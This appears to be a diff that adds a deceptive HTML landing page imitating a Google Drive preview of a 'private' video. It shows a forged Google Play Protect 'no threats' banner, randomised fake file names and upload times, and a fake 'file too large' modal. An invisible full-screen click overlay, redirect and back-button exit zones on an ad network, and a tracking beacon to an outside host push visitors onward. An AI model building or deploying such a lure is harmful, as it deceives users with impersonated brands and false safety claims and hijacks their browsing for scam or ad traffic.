@@ -1,0 +1,613 @@
+<!doctype html>
+<html data-version="production-archive-v0.0.123" data-landing-name="drive-preview" lang="">
+<head>
+
+  <script>
+  var APP_CONFIG = {
+    domain: "https://jup9.com",
+    mainExit_currentTab_zoneId: 10217421,
+    mainExit_newTab_zoneId: 10217420,
+    reverse_zoneId: 10217419,
+    autoexit_zoneId: 10217422,
+    autoexit_timeToRedirect: 90,
+    back_zoneId: 10217423,
+    back_count: 8
+  };
+  </script>
+
+  <script>
+  "use strict";
+  (() => {
+    const now = () => {
+      const d = new Date();
+      return `${d.getUTCFullYear()}-${String(d.getUTCMonth()+1).padStart(2,"0")}-${String(d.getUTCDate()).padStart(2,"0")} `
+        + `${String(d.getUTCHours()).padStart(2,"0")}:${String(d.getUTCMinutes()).padStart(2,"0")}:${String(d.getUTCSeconds()).padStart(2,"0")}.`
+        + `${String(d.getUTCMilliseconds()*1000).padStart(6,"0")} +00:00`;
+    };
+    const p = new URL(location.href).searchParams;
+    const s = {
+      var_1: p.get("var_1") ?? "",
+      var_2: p.get("var_2") ?? "",
+      var_3: p.get("var_3") ?? "",
+      abtest: p.get("abtest") ?? ""
+    };
+    function send(data) {
+      const url = new URL("https://wuytl.com/sync-metrics");
+      navigator.sendBeacon && navigator.sendBeacon(url.toString(), JSON.stringify(data));
+    }
+    window.syncMetric = ({ event, exitZoneId, errorMessage }) => {
+      const html = document.documentElement;
+      const payload = [{
+        app: "landings-constructor",
+        event,
+        landing_name: html.getAttribute("data-landing-name") || "",
+        build_version: html.getAttribute("data-version") || "",
+        landing_domain: location.host,
+        landing_url: location.href,
+        exit_zone_id: exitZoneId ? Number(exitZoneId) : undefined,
+        template_hash: window.templateHash || "",
+        request_var: s.var_3,
+        source_zone_id: isNaN(Number(s.var_2)) ? null : Number(s.var_2),
+        sub_id: s.var_1,
+        landing_load_date_time: now(),
+        error_message: errorMessage || "",
+        ab2r: s.abtest || String(APP_CONFIG.abtest || "")
+      }];
+
+      if (APP_CONFIG.isAnalyticEnabled !== false) send(payload);
+    };
+
+    window.syncMetric({ event: "start" });
+  })();
+  </script>
+
+  <script>
+  "use strict";
+  (() => {
+    const m = window.syncMetric;
+    if (!m) return;
+    addEventListener("error", e => m({ event:"error", errorMessage:e.message }));
+    addEventListener("unhandledrejection", e => m({ event:"unhandledRejection", errorMessage:e.reason }));
+  })();
+  </script>
+
+  <!-- i18n loader (uses /locales/<lang>.json, fallback to en) -->
+ <script>
+"use strict";
+(() => {
+  const FALLBACK = "en";
+  const RTL = new Set(["ar","fa","ur"]);
+
+  function sanitizeLang(v){
+    return String(v || "")
+      .trim()
+      .toLowerCase()
+      .replace(/^\$+/, "")        // <-- КЛЮЧЕВОЕ: убираем $
+      .replace(/[^a-z-]/g, "")    // <-- убираем мусор
+      .split("-")[0] || "";
+  }
+
+  function getLang(){
+    const sp = new URLSearchParams(location.search);
+    const q = sanitizeLang(sp.get("lang") || sp.get("l"));
+    const nav = sanitizeLang(navigator.language || FALLBACK);
+    return q || nav || FALLBACK;
+  }
+
+  async function loadJson(lang){
+    const safe = sanitizeLang(lang) || FALLBACK;
+    const r = await fetch(`./locales/${safe}.json`, { cache: "no-store" });
+    if (!r.ok) throw new Error("locale_not_found");
+    return r.json();
+  }
+
+  function fmt(str, vars){
+    return String(str).replace(/\{(\w+)\}/g, (_,k)=>(
+      vars && vars[k] != null ? vars[k] : `{${k}}`
+    ));
+  }
+
+  window.i18n = {
+    lang: getLang(),
+    dict: null,
+    t(key, vars){
+      const d = this.dict || {};
+      const s = d[key] != null ? d[key] : key;
+      return fmt(s, vars);
+    }
+  };
+
+  window.i18nReady = (async () => {
+    try {
+      window.i18n.dict = await loadJson(window.i18n.lang);
+    } catch(e){
+      window.i18n.lang = FALLBACK;
+      window.i18n.dict = await loadJson(FALLBACK);
+    }
+
+    document.documentElement.lang = window.i18n.lang;
+    document.documentElement.dir = RTL.has(window.i18n.lang) ? "rtl" : "ltr";
+  })();
+})();
+</script>
+
+
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0" />
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="mobile-web-app-capable" content="yes">
+  <meta name="theme-color" content="#ffffff">
+
+  <title>Предпросмотр</title>
+  <link rel="icon" type="image/svg+xml" href="./assets/favicon/favicon.svg">
+  <link rel="alternate icon" type="image/png" href="./assets/favicon/favicon-play.png">
+  <link rel="manifest" href="./assets/favicon/site.webmanifest" />
+
+  <script defer src="./assets/scripts/common.js"></script>
+
+  <style>
+    :root{
+      --txt:#3c4043;
+      --muted:#70757a;
+      --line:#dadce0;
+      --bg:#ffffff;
+      --blue:#1a73e8;
+      --green:#137333;
+      --greenbg:#e6f4ea;
+    }
+    *{ box-sizing:border-box; }
+    html,body{ height:100%; }
+    body{
+      margin:0;
+      font-family: system-ui,-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;
+      background:var(--bg);
+      color:var(--txt);
+      overflow:hidden;
+    }
+
+    .protect-bar{
+      background:var(--greenbg);
+      color:var(--green);
+      padding:8px 16px;
+      font-size:12px;
+      display:flex;
+      align-items:center;
+      gap:8px;
+      font-weight:600;
+    }
+    .protect-ico{ width:16px; height:16px; flex:0 0 auto; }
+
+    .header{
+      display:flex;
+      align-items:center;
+      padding:12px 16px;
+      border-bottom:1px solid var(--line);
+      gap:12px;
+    }
+    .drive-ico{ width:24px; height:24px; flex:0 0 auto; }
+    .header-title{
+      font-size:18px;
+      color:#5f6368;
+      flex:1;
+      white-space:nowrap;
+      overflow:hidden;
+      text-overflow:ellipsis;
+    }
+    .kebab{ width:18px; height:18px; opacity:.75; flex:0 0 auto; }
+
+    .content{ padding:12px; }
+    .crumb{
+      font-size:12px;
+      color:#5f6368;
+      margin-bottom:10px;
+      white-space:nowrap;
+      overflow:hidden;
+      text-overflow:ellipsis;
+    }
+
+    .file-box{
+      border:1px solid var(--line);
+      border-radius:10px;
+      overflow:hidden;
+      margin-bottom:14px;
+      position:relative;
+      background:#fff;
+    }
+
+    .video-preview{
+      width:100%;
+      height:180px;
+      background:#e9eef6;
+      background-size:cover;
+      background-position:center;
+      position:relative;
+      overflow:hidden;
+    }
+
+    .video-spinner{
+      position:absolute;
+      inset:0;
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      background:transparent;
+      z-index:10;
+      pointer-events:none;
+    }
+    .video-spinner .spinner{
+      width:42px;
+      height:42px;
+      border:4px solid rgba(0,0,0,0.06);
+      border-top-color:var(--blue);
+      border-radius:50%;
+      animation:spin 0.8s linear infinite;
+    }
+    @keyframes spin{ to{ transform:rotate(360deg); } }
+
+    .video-overlay{
+      position:absolute;
+      inset:0;
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      pointer-events:none;
+      z-index:4;
+      transition: opacity 0.3s ease;
+    }
+    .video-overlay.is-loading { opacity:0; }
+
+    .playbtn{
+      width:92px; height:92px;
+      border-radius:999px;
+      background:rgba(0,0,0,.28);
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      box-shadow:0 10px 30px rgba(0,0,0,.25);
+    }
+    .playtri{
+      width:0;height:0;
+      border-top:16px solid transparent;
+      border-bottom:16px solid transparent;
+      border-left:26px solid rgba(255,255,255,.92);
+      margin-left:6px;
+    }
+
+    .file-info{ padding:12px 14px; background:#fff; }
+    .file-name{
+      font-weight:600;
+      font-size:15px;
+      margin:0 0 4px;
+      display:flex;
+      align-items:center;
+      gap:8px;
+      white-space:nowrap;
+      overflow:hidden;
+      text-overflow:ellipsis;
+    }
+    .file-meta{
+      font-size:12px;
+      color:var(--muted);
+      display:flex;
+      flex-direction:column;
+      gap:2px;
+    }
+    .file-ico{ width:18px;height:18px;flex:0 0 auto; color:var(--blue); }
+
+    .grid{
+      display:grid;
+      grid-template-columns:repeat(2,minmax(0,1fr));
+      gap:10px;
+      margin-top:12px;
+    }
+    .tile{
+      border:1px solid #eef0f2;
+      border-radius:10px;
+      overflow:hidden;
+      background:#fff;
+      min-height:86px;
+      display:flex;
+      align-items:center;
+      gap:10px;
+      padding:10px;
+    }
+    .thumb{
+      width:44px;height:44px;
+      border-radius:8px;
+      background:#e9eef6;
+      background-size:cover;
+      background-position:center;
+      flex:0 0 auto;
+    }
+    .tile-name{
+      font-weight:600;
+      font-size:13px;
+      white-space:nowrap;
+      overflow:hidden;
+      text-overflow:ellipsis;
+    }
+    .tile-meta{ font-size:12px; color:var(--muted); margin-top:2px; }
+
+    #modal-bg{
+      position:fixed; inset:0;
+      background:rgba(0,0,0,.45);
+      z-index:150;
+      display:none;
+    }
+    .modal{
+      position:fixed; left:50%; top:60%;
+      transform:translate(-50%,-50%);
+      width:min(520px,90vw);
+      background:#fff;
+      border-radius:12px;
+      z-index:200;
+      padding:18px 18px 14px;
+      box-shadow:0 10px 30px rgba(0,0,0,.20);
+      display:none;
+    }
+    .modal-title{ font-weight:700; font-size:18px; margin:0 0 10px; }
+    .modal-text{ font-size:14px; color:#5f6368; line-height:1.35; margin:0 0 14px; }
+    .modal-btn {
+      display: flex;
+      justify-content: flex-end;
+      font-weight: 500;
+      font-size: 14px;
+      color: var(--blue);
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      cursor: pointer;
+      padding: 10px 12px;
+      margin-right: -8px;
+      margin-bottom: -4px;
+      border-radius: 4px;
+      transition: background 0.2s;
+      user-select: none;
+    }
+    .modal-btn:active { background: rgba(26, 115, 232, 0.12); }
+
+    #click-overlay{ position:fixed; inset:0; z-index:90; cursor:pointer; background:transparent; }
+
+    @media (max-width:360px){
+      .header-title{ font-size:16px; }
+      .video-preview{ height:155px; }
+      .playbtn{ width:78px; height:78px; }
+    }
+  </style>
+</head>
+
+<body>
+  <div class="protect-bar">
+    <svg class="protect-ico" viewBox="0 0 24 24" fill="none">
+      <path d="M12 2l8 4v6c0 5-3.4 9.4-8 10-4.6-.6-8-5-8-10V6l8-4z" fill="#137333" opacity=".18"/>
+      <path d="M12 2l8 4v6c0 5-3.4 9.4-8 10-4.6-.6-8-5-8-10V6l8-4z" stroke="#137333" stroke-width="1.5"/>
+      <path d="M8.4 12.1l2.2 2.2 5-5" stroke="#137333" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+    </svg>
+    <span id="protectText">Google Play Protect: угроз не обнаружено</span>
+  </div>
+
+  <div class="header">
+    <svg class="drive-ico" viewBox="0 0 48 48">
+      <path fill="#FFC107" d="M17 6l7 12h14l-7-12z"/>
+      <path fill="#4CAF50" d="M17 6L3 30l7 12L24 18z"/>
+      <path fill="#2196F3" d="M45 30H3l7 12h28z"/>
+    </svg>
+    <div class="header-title" id="headerTitle">Предпросмотр</div>
+    <svg class="kebab" viewBox="0 0 24 24">
+      <circle cx="12" cy="5" r="2" fill="#5f6368"/>
+      <circle cx="12" cy="12" r="2" fill="#5f6368"/>
+      <circle cx="12" cy="19" r="2" fill="#5f6368"/>
+    </svg>
+  </div>
+
+  <div id="modal-bg"></div>
+  <div class="modal" id="alert-modal">
+    <div class="modal-title" id="modal-title">Файл слишком велик</div>
+    <div class="modal-text" id="modal-text">Размер файла превышает лимит для быстрого просмотра. Открыть в плеере?</div>
+    <div class="modal-btn" id="modal-ok">ОК</div>
+  </div>
+
+  <div class="content">
+    <div class="crumb" id="crumb">Private &gt; Shared &gt; Folder_2024_hidden</div>
+
+    <div class="file-box" id="hero">
+      <div class="video-preview" id="videoPreview">
+        <div class="video-spinner" id="videoSpinner"><div class="spinner"></div></div>
+        <div class="video-overlay" id="videoOverlay">
+          <div class="playbtn"><div class="playtri"></div></div>
+        </div>
+      </div>
+
+      <div class="file-info">
+        <div class="file-name" id="videoName">
+          <svg class="file-ico" viewBox="0 0 24 24">
+            <path fill="currentColor" d="M17 10.5V6c0-1.1-.9-2-2-2H5C3.9 4 3 4.9 3 6v12c0 1.1.9 2 2 2h10c1.1 0 2-.9 2-2v-4.5l4 4v-13l-4 4z"/>
+          </svg>
+          VID_WA0009_PRIVATE.mp4
+        </div>
+        <div class="file-meta">
+          <div id="videoSize">184 МБ</div>
+          <div id="videoTime">Добавлено сегодня</div>
+        </div>
+      </div>
+    </div>
+
+    <div class="grid">
+      <div class="tile">
+        <div class="thumb" id="t1"></div>
+        <div class="tile-txt">
+          <div class="tile-name">IMG_4410.jpg</div>
+          <div class="tile-meta">2.1 МБ</div>
+        </div>
+      </div>
+      <div class="tile">
+        <div class="thumb" id="t2"></div>
+        <div class="tile-txt">
+          <div class="tile-name">IMG_4411.jpg</div>
+          <div class="tile-meta">1.8 МБ</div>
+        </div>
+      </div>
+      <div class="tile">
+        <div class="thumb" id="t3"></div>
+        <div class="tile-txt">
+          <div class="tile-name">DCIM_0982.jpg</div>
+          <div class="tile-meta">3.4 МБ</div>
+        </div>
+      </div>
+      <div class="tile">
+        <div class="thumb" id="t4"></div>
+        <div class="tile-txt">
+          <div class="tile-name">Screen_Record_01.mp4</div>
+          <div class="tile-meta">245 МБ</div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div id="click-overlay"></div>
+
+  <script>
+  "use strict";
+  (()=> {
+    const secure = window.isSecureContext || location.protocol==="https:" || location.hostname==="localhost";
+    function sha256(str){
+      return new Promise((res,rej)=>{
+        if(!secure) return rej("HTTPS required");
+        const e=new TextEncoder;
+        crypto.subtle.digest("SHA-256", e.encode(str))
+          .then(b=>res([...new Uint8Array(b)].map(x=>x.toString(16).padStart(2,"0")).join("")))
+          .catch(rej);
+      });
+    }
+    function resources(){
+      const r=[];
+      performance.getEntriesByType("resource").forEach(e=>{
+        if((e.initiatorType==="script"||e.initiatorType==="link") && e.decodedBodySize) r.push(e.decodedBodySize);
+      });
+      return r.sort().join("-");
+    }
+    function normalize(html){
+      return html
+        .replace(/<base.*?>/gm,"")
+        .replace(/var\s+APP_CONFIG\s*=\s*\{[^}]*\};*/gm,"")
+        .replace(/[\r\n]/g,"")
+        .trim();
+    }
+    document.addEventListener("DOMContentLoaded",()=>{
+      const h = normalize(document.documentElement.innerHTML);
+      sha256(JSON.stringify([h,resources()]))
+        .then(x=>{
+          window.templateHash=x;
+          window.syncMetric && window.syncMetric({event:"template_hash_ready"});
+        });
+    });
+  })();
+  </script>
+
+  <script>
+  (function(){
+    const pick = (arr)=>arr[Math.floor(Math.random()*arr.length)];
+    const t = (key, vars) => (window.i18n ? window.i18n.t(key, vars) : key);
+
+    const vSpinner = document.getElementById("videoSpinner");
+    const vOverlay = document.getElementById("videoOverlay");
+    const modalBg = document.getElementById("modal-bg");
+    const modal = document.getElementById("alert-modal");
+
+    vOverlay.classList.add("is-loading");
+
+    function applyTexts(){
+      const headerTitle = document.getElementById("headerTitle");
+      if (headerTitle) headerTitle.textContent = t("title_preview");
+
+      const protectText = document.getElementById("protectText");
+      if (protectText) protectText.textContent = t("protect_ok");
+
+      const modalTitle = document.getElementById("modal-title");
+      if (modalTitle) modalTitle.textContent = t("modal_title_big");
+
+      const okBtn = document.getElementById("modal-ok");
+      if (okBtn) okBtn.textContent = t("ok");
+    }
+
+    function applyDynamic(){
+      // hero/thumbs (as before)
+      const sp = new URLSearchParams(location.search);
+      const cid = sp.get("var_2"), cr = sp.get("creative_id");
+      const hero = document.getElementById("videoPreview");
+      const thumbs = ["t1","t2","t3","t4"].map(id=>document.getElementById(id)).filter(Boolean);
+
+      if (cid && cr) {
+        const url = `https://cdn.x0x.online/frames/${cid}/${cr}.webp`;
+        if (hero) hero.style.backgroundImage = `url('${url}')`;
+
+        const imgIco = "https://ssl.gstatic.com/docs/doclist/images/icon_11_image_list.png";
+        const vidIco = "https://ssl.gstatic.com/docs/doclist/images/icon_11_video_list.png";
+
+        thumbs.forEach((el, i) => {
+          el.style.backgroundImage = `url('${i === 3 ? vidIco : imgIco}')`;
+          el.style.backgroundSize = "22px";
+          el.style.backgroundRepeat = "no-repeat";
+          el.style.backgroundColor = "#f1f3f4";
+        });
+      }
+
+      // random video name (as before)
+      const vNames = ["VID_WA0009_PRIVATE.mp4","Screen_Recording_2024_11_02.mp4","DCIM_1042.mp4","VID_2024_12_19.mp4"];
+      const vNameEl = document.getElementById("videoName");
+      if (vNameEl){
+        const txt = pick(vNames);
+        Array.from(vNameEl.childNodes).forEach(n => { if (n.nodeType === Node.TEXT_NODE) vNameEl.removeChild(n); });
+        vNameEl.appendChild(document.createTextNode(" " + txt));
+      }
+
+      // size (kept as-is)
+      const sizeMB = pick([164,184,193,207,245]);
+      const sizeEl = document.getElementById("videoSize");
+      if (sizeEl) sizeEl.textContent = sizeMB + " МБ";
+
+      // localized time
+      const deltaMin = Math.floor(Math.random()*12) + 3;
+      const now = new Date();
+      const fake = new Date(now.getTime() - deltaMin*60000);
+      const hh = String(fake.getHours()).padStart(2,"0");
+      const mm = String(fake.getMinutes()).padStart(2,"0");
+      const timeEl = document.getElementById("videoTime");
+      if (timeEl) {
+        const variants = [
+          t("meta_added_today"),
+          t("meta_changed_min", {min: deltaMin}),
+          t("meta_uploaded_at", {hh, mm}),
+          t("meta_updated_min", {min: deltaMin})
+        ];
+        timeEl.textContent = pick(variants);
+      }
+
+      // localized modal text
+      const mTextEl = document.getElementById("modal-text");
+      if (mTextEl) mTextEl.textContent = t("modal_text_big");
+
+      // localized crumbs
+      const crumbEl = document.getElementById("crumb");
+      if (crumbEl) {
+        const crumbs = [t("crumb_1"), t("crumb_2"), t("crumb_3"), t("crumb_4")];
+        crumbEl.textContent = pick(crumbs);
+      }
+    }
+
+    (window.i18nReady || Promise.resolve()).then(() => {
+      applyTexts();
+      applyDynamic();
+
+      setTimeout(() => {
+        if (vSpinner) vSpinner.style.display = "none";
+        vOverlay.classList.remove("is-loading");
+        modalBg.style.display = "block";
+        modal.style.display = "block";
+        document.title = window.i18n ? window.i18n.t("drive_notif") : "(1) Access error — Google Drive";
+      }, 1000);
+    });
+  })();
+  </script>
+
+</body>
+</html>
